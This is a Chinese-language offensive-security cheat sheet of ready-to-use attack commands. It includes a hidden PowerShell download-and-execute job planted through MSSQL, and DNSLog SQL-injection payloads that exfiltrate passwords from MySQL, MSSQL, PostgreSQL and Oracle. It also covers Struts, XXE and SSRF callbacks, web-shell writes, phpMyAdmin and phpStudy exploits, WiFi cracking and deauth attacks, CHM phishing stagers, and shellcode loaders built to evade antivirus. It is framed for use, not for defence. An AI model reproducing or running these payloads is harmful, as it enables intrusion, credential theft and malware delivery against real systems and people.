USE msdb; EXEC dbo.sp\_add\_job @job\_name = N'syspolicy\_purge\_now' ; EXEC sp\_add\_jobstep @job\_name = N'syspolicy\_purge\_now', @step\_name = N'syspolicy\_purge\_step1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://IP\_OR\_HOSTNAME/file''))"', @retry\_attempts = 1, @retry\_interval = 5 ;EXEC dbo.sp\_add\_jobserver @job\_name = N'syspolicy\_purge\_now '; EXEC dbo.sp\_start\_job N'syspolicy\_purge\_now ';
使用在注入点处，使用burp进行url编码，编码后前面加%20(空格URL编码)

```

```
注入无列名


```

```
http://url/index.php?id=1 order by 6
http://url/index.php?id=-1 union select 1,(select \`4\` from (select 1,2,3,4,5,6 union select \* from users)a limit 1,1)-- -
http://url/index.php?id=-1 union select 1,(select concat(\`3\`,0x3a,\`4\`) from (select 1,2,3,4,5,6 union select \* from users)a limit 1,1)-- -

```

```
DNSLog


```

```
http://ceye.io
http://www.dnslog.cn/

```

```
注入


```

###### MYSQL

```
显示数据库
?id=1' and if((select load\_file(concat('\\\\\\\\',(select database()),'.jhsefs.ceye.io\\\\sql\_test'))),1,0)--+
显示数据库
?id=1' and if((select load\_file(concat('\\\\\\\\',(select schema\_name from information\_schema.schemata limit {0},1),'.jhsefs.ceye.io\\\\sql\_test'))),1,0)--+
显示表
?id=1' and if((select load\_file(concat('\\\\\\\\',(select table\_name from information\_schema.tables where table\_schema='dbname' limit 0,1),'.jhsefs.ceye.io\\\\sql\_test'))),1,0)--+
?id=1' and if((select load\_file(concat('\\\\\\\\',(select table\_name from information\_schema.tables where table\_schema=0x1x1x2x limit 0,1),'.jhsefs.ceye.io\\\\sql\_test'))),1,0)--+
显示字段
?id=1' and if((select load\_file(concat('\\\\\\\\',(select column\_name from information\_schema.columns where table\_name='users' limit 0,1),'.jhsefs.ceye.io\\\\sql\_test'))),1,0)--+
显示数据
?id=1' and if((select load\_file(concat('\\\\\\\\',(select hex(user) from users limit 0,1),'.jhsefs.ceye.io\\\\sql\_test'))),1,0)--+

```

```
MSSQL


```

```
查数据


```

```
?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn\_varbintohexstr(convert(varbinary,rtrim(pass))) FROM test.dbo.test\_user where \[USER\] = 'admin')%2b'.cece.nk40ci.ceye.io';EXEC('master..xp\_dirtree "\\'%2b@host%2b'\\foobar$"');
Sa密码
?id=1DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn\_varbintohexstr(password\_hash)FROM sys.sql\_loginsWHERE \\'+@host+'\\foobar$"');

```

```
postgreSQL


```

```
?id=1;DROP TABLE IF EXISTS table\_output;CREATE TABLE table\_output(content text);CREATE OR REPLACE FUNCTION temp\_function() RETURNS VOID AS $$ DECLARE exec\_cmd TEXT;DECLARE query\_result TEXT;BEGIN SELECT INTO query\_result (select encode(pass::bytea,'hex') from test\_user where id =1);exec\_cmd := E'COPY table\_output(content) FROM E\\'\\\\\\\\\\\\\\\\'||query\_result||E'.pSQL.3.nk40ci.ceye.io\\\\\\\\foobar.txt\\'';EXECUTE exec\_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp\_function();

```

```
Oracle


```

```
?id=1 union SELECT UTL\_HTTP.REQUEST((select pass from test\_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL;
?id=1 union SELECT DBMS\_LDAP.INIT((select pass from test\_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL;
?id=1 union SELECT HTTPURITYPE((select pass from test\_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL;
?id=1 union SELECT UTL\_INADDR.GET\_HOST\_ADDRESS((select pass from test\_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL;

```

```
命令执行


```

```
\>curl http://0ox095.ceye.io/\`whoami\`
>ping \`whoami\`.b182oj.ceye.io
>ping %CD%.lfofz7.dnslog.cn 

```

```
XXE


```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root \[
<!ENTITY % remote SYSTEM "http://b182oj.ceye.io/xxe\_test">
%remote;\]>
<root/>

```

##### Struts

```
xx.action?redirect:http://b182oj.ceye.io/%25{3\*4}
xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String\[\]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://b182oj.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}

```

```
weblogic


```

```
/uddiexplorer/SearchPublicRegistries.jsp?operator=http://b182oj.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search

```

```
Resin


```

```
xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://b182oj.ceye.io/ssrf

```

```
Discuz


```

```
/forum.php?mod=ajax&action=downremoteimg&message=\[img=1,1\]http://b182oj.ceye.io/xx.jpg\[/img\]&formhash=xxoo

```

```
PHPMyadmin


```

##### LOG

```
show variables like '%general%';  #查看配置
set global general\_log = on;  #开启general log模式
set global general\_log\_file = '/var/www/html/1.php'; 
select '<?php eval($\_POST\[cmd\]);?>'

```

##### 慢查询

```
show variables like '%slow%';
set GLOBAL slow\_query\_log\_file='C:/WWW/slow.php';
set GLOBAL slow\_query\_log=on;
set GLOBAL log\_queries\_not\_using\_indexes=on;
select '<?php phpinfo();?>' from mysql.db where sleep(10);

```

```
任意文件读取


```

```
phpMyAdmin 2.x
POST /scripts/setup.php HTTP/1.1
Host: ip:8080
Accept-Encoding: gzip, deflate
Accept: \*/\*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
action=test&configuration=O:10:"PMA\_Config":1:{s:6:"source",s:11:"/etc/passwd";}

```

```
LFI


```

```
phpMyAdmin 4.0.1--4.2.12，PHP < 5.3.4
/gis\_data\_editor.php?token=2941949d3768c57b4342d94ace606e91&gis\_data\[gis\_type\]=/../../../../phpinfo.txt%00
phpMyAdmin 4.8.0和4.8.1 后台权限
>select '<?php phpinfo();exit;?>'
/index.php?target=db\_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess\_\*\*\*

```

```
RCE


```

```
PhpMyAdmin 4.0.x-4.6.2，PHP 4.3.0-5.4.6后台权限
>cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');"
phpMyAdmin 4.8.0~4.8.3
CREATE DATABASE foo;
CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );
INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';
访问http://10.1.1.10/chk\_rel.php?fixall\_pmadb=1&db=foo
INSERT INTO pma\_\_column\_infoSELECT '1', 'foo', 'bar', 'baz', 'plop',
'plop', 'plop', 'plop','../../../../../../../../tmp/sess\_\*\*\*','plop';
访问
/tbl\_replace.php?db=foo&table=bar&where\_clause=1=1&fields\_name\[multi\_edit\]\[\]\[\]=baz&clause\_is\_unique=1

```

```
PHP-FPM RCE


```

```
\>git clone https://github.com/neex/phuip-fpizdam.git
>cd phuip-fpizdam
>go get -v && go build
>go run . http://127.0.0.1/index.php
http://127.0.0.1/index.php?a=id
多执行几次

```

#### phpstudy 后门

```
php:5.2.17   5.4.45
GET / HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Encoding:gzip,deflate
Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 2

```

cmdhijack

```
From: https://hackingiscool.pl/
poc完整的命令行
cmd.exe /c "ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe"
可能产生的影响
包括拒绝服务，信息泄露，任意代码执行（取决于目标应用程序和系统）。
以web应用为例

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpCUFE960C4R8Nt5JKic1OCFzldk7ccibI9EMdicicpUa5r3ibiczOQ56cahNw/640?wx_fmt=png)

```
由于使用了escapeshellcmd()，不易受命令注入的影响，使用本方法
一个poc


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpvZpwd3D8duS8p2upmkzGxFLxibOB02W9IHPpHWLaHWKk3wkazicUjDfQ/640?wx_fmt=png)

`不限于任何位置，文件`

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpQhZLXescQXhxklp6JAUInumSJ2pzmMmaJULiccjgTfgCic1BicFrttaiaQ/640?wx_fmt=png)

```
再扩展一下 
如，powershell带-enc执行，或mshta等方法，可参考
https://lolbas-project.github.io/，但是依照windows的特性，在无法将完整字符串解析为有效路径的情况下，会拆分空格后面的内容，这里可以使用&符号
如：
>cmd.exe /c "cmd /c /../../../../../../../../../../windows/system32/calc&powershell -enc xxxx"
>cmd.exe /c "cmd /c /../../../../../../../../../../windows/system32/calc&mshta http://192.168.0.105:8080/xsuUEWJ.hta"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpcey50q6Y76F0HiazN87ed3d22Ce39x0Bc4ozt3lN4p3uvndw7MM4IGg/640?wx_fmt=png)

### **Database**

#### **MSSQL**

```
判断数据库
;and (select count(\*) from sysobjects)>0 mssql
;and (select count(\*) from msysobjects)>0 access
查库
?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)>0 --
?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master'))>0 --
查表
import requests
import re
table\_list = \[''\]
def get\_sqlserver\_table(table\_list, table\_num):
  for num in range(0,table\_num):
    # print("','".join(table\_list))
    sql\_str = "and (select top 1 name from \[xxxx\].sys.all\_objects where type='U' AND is\_ms\_shipped=0 and name not in ('{}'))>0".format("','".join(table\_list))
    url = "http://www.xxxxx.cn/x.aspx?cid=1' {} AND 'aNmV'='aNmV".format(sql\_str)
    r = requests.get(url, headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'})
    res = re.search(r'\\'(.\*)\\'', r.content.decode('utf-8'),  re.M|re.I)
    table\_name = str(res.group(1))
    table\_list.append(table\_name)
    print("\[{}\] - TableName: {}".format(str(r.status\_code), table\_name))
if \_\_name\_\_ == "\_\_main\_\_":
  get\_sqlserver\_table(table\_list, 16)
判断是否存在xp\_cmdshell
and 1=(select count(\*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp\_cmdshell')
执行命令
;exec master..xp\_cmdshell "net user name password /add"—
查看权限
and (select IS\_SRVROLEMEMBER('sysadmin'))=1--  //sa
and (select IS\_MEMBER('db\_owner'))=1--   //  dbo
and (select IS\_MEMBER('public'))=1--  //public
站库分离获取服务器IP
;insert into OPENROWSET('SQLOLEDB','uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;', 'select \* from dest\_table') select \* from src\_table;--
LOG备份
;alter database testdb set RECOVERY FULL --
;create table cmd (a image) --
;backup log testdb to disk = 'c:\\wwwroot\\shell.asp' with init --
;insert into cmd (a) values ('<%%25Execute(request("chopper"))%%25>')-- 
;backup log testdb to disk = 'c:\\wwwroot\\shell.asp' –
2000差异备份
;backup database testdb to disk ='c:\\wwwroot\\bak.bak';--
;create table \[dbo\].\[testtable\] (\[cmd\] \[image\]);--
;insert into testtable (cmd) values(木马hex编码);--
;backup database testdb to disk='c:\\wwwroot\\upload\\shell.asp' WITH DIFFERENTIAL,FORMAT;--
2005差异备份
;alter/\*\*/database/\*\*/\[testdb\]/\*\*/set/\*\*/recovery/\*\*/full—
;declare/\*\*/@d/\*\*/nvarchar(4000)/\*\*/select/\*\*/@d=0x640062006200610063006B00/\*\*/backup/\*\*/database/\*\*/\[testdb\]/\*\*/to/\*\*/disk=@d/\*\*/with/\*\*/init--
;create/\*\*/table/\*\*/\[itpro\](\[a\]/\*\*/image)—
;declare/\*\*/@d/\*\*/nvarchar(4000)/\*\*/select/\*\*/@d=0x640062006200610063006B00/\*\*/backup/\*\*/log/\*\*/\[testdb\]/\*\*/to/\*\*/disk=@d/\*\*/with/\*\*/init--
;insert/\*\*/into/\*\*/\[itpro\](\[a\])/\*\*/values(木马hex编码)—
;declare/\*\*/@d/\*\*/nvarchar(4000)/\*\*/select/\*\*/@d=木马保存路径的SQL\_EN编码/\*\*/backup/\*\*/log/\*\*/\[testdb\]/\*\*/to/\*\*/disk=@d/\*\*/with/\*\*/init--
;drop/\*\*/table/\*\*/\[itpro\]—
;declare/\*\*/@d/\*\*/nvarchar(4000)/\*\*/select/\*\*/@d=0x640062006200610063006B00/\*\*/backup/\*\*/log/\*\*/\[testdb\]/\*\*/to/\*\*/disk=@d/\*\*/with/\*\*/init--

```

```
PostgreSQL


```

```
连接
>psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432
查看版本
>select version();
列出数据库
>select datname from pg\_database;
列出所有表名
>select \* from pg\_tables;
读取账号秘密
>select usename,passwd from pg\_shadow;
当前用户
>select user;
修改密码
>alter user postgres with password '123456';
列目录
>select pg\_ls\_dir('/etc');
读文件
>select pg\_read\_file('postgresql.auto.conf',0,100); #行数
&
>drop table wooyun;
>create table wooyun(t TEXT);
>copy wooyun FROM '/etc/passwd';
>select \* from wooyun limit 1 offset 0;
&
>select lo\_import('/etc/passwd',12345678);
>select array\_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg\_largeobject where loid=12345678 order by pageno)a;
写文件
create table shell(shell text not null);
insert into shell values($$<?php @eval($\_POST\[1\]);?>$$);
copy shell(shell) to '/var/www/html/shell.php';
&
copy (select '<?php phpinfo();?>') to '/var/www/html/shell.php';
爆破
MSF>use auxiliary/scanner/postgres/postgres\_login
执行命令版本8.2以下
>create function system(cstring) returns int AS '/lib/libc.so.6', 'system' language C strict;
>create function system(cstring) returns int AS '/lib64/libc.so.6', 'system' language C strict;
>select system('id');

```

**近源攻击**
--------

### **WI-FI 破解**

#### wifite

```
Kali下工具wifite，加载网卡，开启监听模式，#airmon-ng check kill
#airmon-ng start wlan1
安装hcxtools v4.2.0或更高版本，hcxdumptool v4.2.0或更高版本
#apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
#git clone https://github.com/ZerBea/hcxtools
#cd hcxtools
#make
#make install 
#git clone https://github.com/ZerBea/hcxdumptool
#cd hcxdumptool
#make
#make install
#wifite –-dict /root/Desktop/wordlist.txt  加载

```

#### Aircrack-ng

```
#airmon-ng start wlan0 开启监听模式
#airodump-ng wlan0mon  查看数据包
#airodump-ng –c 1 –bssid APmac –w name wlan1mon保存某AP数据包
#aireplay-ng –deauth 10 –a APmac wlan0mon  deauth攻击
#aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon deauth攻击某个设备直至获取handshake(握手包)
#airmon-ng stop wlan0mon  关闭监听模式
#aircrack-ng –w wordlist.txt name.cap 指定字典破解密码

```

```
钓鱼网络


```

#### Hostapd

```
#apt install hostapd dnsmasq
#cd /etc/hostapd
#vim open.conf 创建无加密热点
Interface=wlan1
Ssid=FreeWIFI
Driver=nl80211
Channel=1
Hw\_mode=g
#vim /etc/dnsmasq.conf
Dhcp-range=10.0.0.1, 10.0.0.255,12h
Interface=wlan1
#systemctl restart dnsmasq
消除网卡限制
#nmcli radio wifi off
#rfkill unblock wlan
#ifconfig wlan1 10.0.0.1/24
#hostapd open.conf
嗅探
#sysctl –w net.ipv4.ip\_forward=1
#iptables –t nat –A POSTROUTING –o 网卡 –j MASQUERADE
#bettercap –iface wlan1
#net.show
#net.sniff on
#driftnet –i wlan1

```

```
Hostapd-wpe


```

```
#apt install hostapd-wpe
#vim /etc/hostapd-wpe/hostapd-wpe.conf
配置interface=wlan1
Ssid=
Channel=
证书修改
#cd /etc/hostapd-wpe/certs/
文件ca.cnf server.cnf client.cnf
修改countrName stateOrProvinceName localityName …….
#rm –rf \*.pem \*.der \*.csr \*.crt \*.key \*.p12 serial\* index.txt\*
#make clean
#./bootstrap
#make install
执行创建热点
#hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
获取到密码时使用asleep破解
#asleap –C Challenge值 –R response值 –W 字典文件

```

### **无线干扰**

#### **Beacon flood**

```
需切换网卡为监听模式
#airmon-ng start wlan1
创建大量虚假热点Mdk3 mon0 b
#mdk3 wlan1mon b -f /root/wifi.txt -a -s 1500

```

#### Deauth flood

```
针对AP
#airmon-ng start wlan1
#aireplay-ng –deauth 10 –a AP’s mac address mon0
针对AP内设备
#airmon-ng start wlan1       将网卡置为监听模式
#airodump-ng wlan1mon –bssid 目标ap的ssid
#aireplay-ng -0 0 -a ap的ssid -c AP的ssid wlan0mon 开始攻击

```

#### Mdk3 destruction

```
针对范围内
#mdk3 wlan1mon d
针对AP
#airodump-ng wlan1mon
#mdk3 wlan1mon a -a APmac 发起攻击
黑名单
#mdk3 wlan1mon d –c 信道 –b /blacklist.txt.
#mdk3 wlan1mon  b -n test -w -g -c 1 -s 200

```

#### WiFi 芯片 esp8266

#### Mdk4

```
#mdk4 wlan0mon d

```

```
CVE-2018-4407


```

```
Scapy
send(IP(dst="192.168.1.132",options=\[IPOption("A"\*8)\])/TCP(dport=2323,options=\[(19, "1"\*18),(19, "2"\*18)\]))
Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）
Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备（通过安全更新2018-001修复）
Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备（通过安全更新2018-005中修复）
Apple OS X El Capitan及更早版本：所有设备

```

```
绕过mac地址认证


```

##### Ifconfig

```
#ifconfig wlan1 down
#ifconfig wlan1 hw ether xx:xx:xx:xx:xx:xx
#ifconfig wlan1 up

```

##### Macchanger

```
#macchanger –m xx:xx:xx:xx:xx:xx wlan1
#macchanger –r wlan1

```

### **BadUSB**

### **克隆卡**

### **蓝牙**

**鱼叉式攻击**
---------

### **钓鱼邮件**

```
假冒的内部域名
假冒的外部域名
近似域名
被黑账户
群发/特定发
虚构情景/恶意连接/恶意文件

```

#### **CVE**

##### **CVE-2017-11882**

```
Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016

```

##### **CVE-2017-0199**

```
Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016，Vista SP2，Server 2008 SP2，Windows 7 SP1，Windows 8.1

```

```
CVE-2012-0158


```

```
Microsoft Office 2003 SP3、2007 SP2和SP3，以及2010 Gold和SP1；Office 2003 Web组件SP3；SQL Server 2000 SP4、2005 SP4和2008 SP2，SP3和R2; BizTalk Server 2002 SP1；Commerce Server 2002 SP4、2007 SP2和2009 Gold和R2; Visual FoxPro 8.0 SP1和9.0 SP2; 和Visual Basic 6.0

```

```
CVE-2017-0143


```

```
Microsoft Windows Vista SP2；Windows Server 2008 SP2和R2 SP1; Windows 7 SP1；Windows 8.1; Windows Server 2012 Gold和R2；Windows RT 8.1；Windows 10 Gold，1511和1607；以及 和Windows Server 2016
OFFICE文档/ PDF文件

```

#### **可执行文件**

#### **文档文件的伪造**

#### **扩展名 / 图标**

#### **捆绑**

#### **宏**

#### **0day**

#### **CHM**

```
使用编译的HTML文件加载恶意代码。
使用EasyCHM对html进行编译，在html文件中插入恶意代码。
使用MSF生成powershell格式的web\_delivery模块
使用Rundll32配合MyJSRAT实施运行无弹窗

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpnr07rWic2SoPQWWsp9n498oicmfQLrs0IeVTCYKtibWgWibNEDHphTxOGQ/640?wx_fmt=png)

`把命令base编码避免特殊符号`

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFputj5bEEjTAG9oIbbiclkibffJOhnnwCjT5x8EchEiabYckuj3EU4Oxwcw/640?wx_fmt=png)

```
执行语句编码后
>powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==
通过JSRat执行powershell上线命令
https://github.com/Ridter/MyJSRat
>python MyJSRat.py -i 192.168.1.107 -p 8888 -c "powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA=="

```

```
访问http://ip/wtf复制利用语句到html文件后编译

```

```
<PARAM \\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.0.107:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'>

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpAicLslMibGnlChDmTTXibfI6WibwmFAfr7wwRwwLNRfgbStjnVcUGwVMNA/640?wx_fmt=png)

正常打开 CHM 文件，无弹窗上线。

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpdSCD1jHia7WQtTslbNUUjOGPalqErUJ2qh5TnxAIMCB3J1BibBiavK6Ig/640?wx_fmt=png)

### **钓鱼链接  
**

#### **URL 跳转**

#### **结合恶意文档或程序**

#### **短 URL**

#### **结合水坑攻击**

#### **相似域名**

#### **域名窃取**

### **第三方服务鱼叉**

```
通过社交软件建立关系，如男女朋友，师父徒弟，HR，寻求业务等进行钓鱼攻击


```

免杀
==

MSF 免杀
------

### nps\_payload

```
\>python nps\_payload.py正常生成
>msfconsole -r msbuild\_nps.rc开启监听
>%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe xx.xml
>wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \\\\<attackerip>\\<share>\\msbuild\_nps.xml
正常执行结束进程msbuild会失去会话，以下保存bat执行
获得session后立刻迁移进程
@echo off
echo \[\*\] Please Wait, preparing software ..
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\xxx.xml
exit

```

### 编码器

```
\>set EnableStageEncoding true
>set stageencoder x86/fnstenv\_mov 编码进行免杀
>set stageencodingfallback false
&
>msfvenom --list encoders列出编码器

```

### c/c++ 源码免杀

```
\>msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f c -o 1.c
-i编码20次
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe

```

```
指针执行


```

```
unsigned char buf\[\] =
"shellcode";
#pragma comment(linker,"/subsystem:\\"Windows\\" /entry:\\"mainCRTStartup\\"") //windows控制台程序不出黑窗口
main()
{
  ( (void(\*)(void))&buf)();
}
使用vc6.0组建编译后在靶机执行

```

当前过不了火绒，360 动态静态可过

#### 申请动态内存

```
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(linker,"/subsystem:\\"Windows\\" /entry:\\"mainCRTStartup\\"") //windows控制台程序不出黑窗口
unsigned char buf\[\] =
"shellcode";
main()
{
  char \*Memory;
  Memory=VirtualAlloc(NULL, sizeof(buf), MEM\_COMMIT | MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE);
  memcpy(Memory, buf, sizeof(buf));
  ((void(\*)())Memory)();
}

```

```
嵌入汇编


```

```
#include <windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode\[\] ="";
void main()
{
  \_\_asm
  {
    mov eax, offset shellcode
    jmp eax
  }
}

```

```
强制类型转换


```

```
#include <windows.h>
#include <stdio.h>
unsigned char buf\[\] ="";
void main()
{
 ((void(WINAPI\*)(void))&buf)();
}

```

#### 汇编花指令

```
#include <windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode\[\] ="";
void main()
{
    \_\_asm
  {
    mov eax, offset shellcode
    \_emit 0xFF  
    \_emit 0xE0
  }
}

```

#### XOR 加密

```
https://github.com/Arno0x/ShellcodeWrapper安装
生成raw格式木马
>msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f raw -o shell.raw

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp0ZnmxItXus1rJyZrUhnib4kKuSVI5Wibxc5LqPBGFIU8QX0cpypzxPAw/640?wx_fmt=png)加密

```
\> python shellcode\_encoder.py -cpp -cs -py shell.raw thisiskey xor
生成的py文件使用py2exe编译执行
生成的cs文件使用csc.exe编译执行
生成的cpp文件使用vc6.0编译，去掉预编译头编译执行

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpwicMP4QEhCKldyPf6E0CQ4V4vHLV6qNRreVQd0UDjLQRUGr8uqImiarg/640?wx_fmt=png)远程线程注入

```
目前过火绒，不过360，可组合一下
Vs新建c++控制台程序
右键属性-》将MFC的使用选为在静态库中使用MFC
生成c格式shellcode粘贴进remote inject.cpp

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpKf4LtZ9225CybXhiapkJ3BXKtKQVWEAvia3vHR1j1LeyfgExvG6paN3Q/640?wx_fmt=png)

```
生成项目
能成功上线，并开启calc进程

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpRpQrxebaiaQFOJPibtPYbHqZTjm5G2346ibZYKl5BicLNZzWCP4qI6VbCA/640?wx_fmt=png)

#### **加载器免杀**

```
shellcode\_launcher
https://github.com/clinicallyinane/shellcode\_launcher/
生成payload(raw)
>msfvenom -p  windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 6 -b '\\x00' lhost=192.168.0.108 lport=12138 -f raw -o shellcode.raw
加载器加载
>shellcode\_launcher.exe -i shellcode.raw

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpmSoiapiaVcKsDmawO5rBV0aPtcWhCHOYK7jEo9rYKqiauxOZRfckiaHEUg/640?wx_fmt=png)

##### SSI 加载  

```
https://github.com/DimopoulosElias/SimpleShellcodeInjector
生成payload(c)
>msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.0.108 lport=12138 -f c -o shellcode.c
执行
>cat shellcode.c |grep -v unsigned|sed "s/\\"\\\\\\x//g"|sed "s/\\\\\\x//g"|sed "s/\\"//g"|sed ':a;N;$!ba;s/\\n//g'|sed "s/;//g"

```

```
MSF监听
可使用minGW自行编译
>gcc SimpleShellcodeInjector.c -o xxx.exe
执行
>xxx.exe +生成的编码

```

### **c# 源码免杀**

#### **直接编译**

```
生成payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
